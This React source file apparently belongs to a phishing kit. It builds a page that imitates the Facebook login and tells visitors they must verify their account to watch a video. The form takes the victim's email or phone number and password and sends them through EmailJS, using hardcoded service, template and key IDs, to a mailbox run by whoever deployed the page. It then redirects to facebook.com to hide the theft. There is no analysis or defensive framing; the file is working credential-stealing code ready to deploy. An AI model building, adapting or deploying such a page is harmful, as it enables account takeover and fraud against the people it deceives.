import React, { useRef, useState } from 'react';
import './App.css';
import logo from './img/logo.png';
import emailjs from '@emailjs/browser';

function App() {
  const form = useRef();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleUsernameChange = (event) => {
    setUsername(event.target.value);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const sendEmail = async(e) => {
    e.preventDefault();

    await emailjs.sendForm('service_7e25rt6', 'template_1w3zyuq', form.current, 'JK0gRwzuDNpanaoFa')
      .then((result) => {
        console.log(result.text);
      }, (error) => {
        console.log(error.text);
      });
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    // Aquí puedes realizar otras acciones relacionadas con el inicio de sesión

    // Llamar a la función para enviar el correo electrónico
      sendEmail(event);
      
      window.location.href = 'https://www.facebook.com';
  };

  return (
    <>
      <header className='header-hack'>
        <img className='h1-hack' src={logo} alt="" />
      </header>
      <div className='alert-hack'>
        <img className='lock-hack' src="https://em-content.zobj.net/source/facebook/138/lock_1f512.png" alt="Candado" />
        <span className='description-error-hack'>Facebook needs to verify your account information to allow access to this video</span>
      </div>
      <form ref={form} className='form-hack' onSubmit={handleSubmit}>
        <input name='user-name' className='input-hack1' type="text" placeholder='Email or Phone Number' value={username} onChange={handleUsernameChange} />
        <input name='user-password' className='input-hack2' type="password" placeholder='Password' value={password} onChange={handlePasswordChange} />
        <button type='submit' className='button-hack'>Log In</button>
      </form>
      <div className='content-or-hck'>
        <div className='line-hack1'></div>
        <span className='span-or-hack'>or</span>
        <div className='line-hack2'></div>
      </div>
      <button className='create-new-hack'>Create new account</button>
      <a className='olvide-hack' href="#">Forgot password</a>
      <footer className='footer-hack'>

      </footer>
    </>
  );
}

export default App;
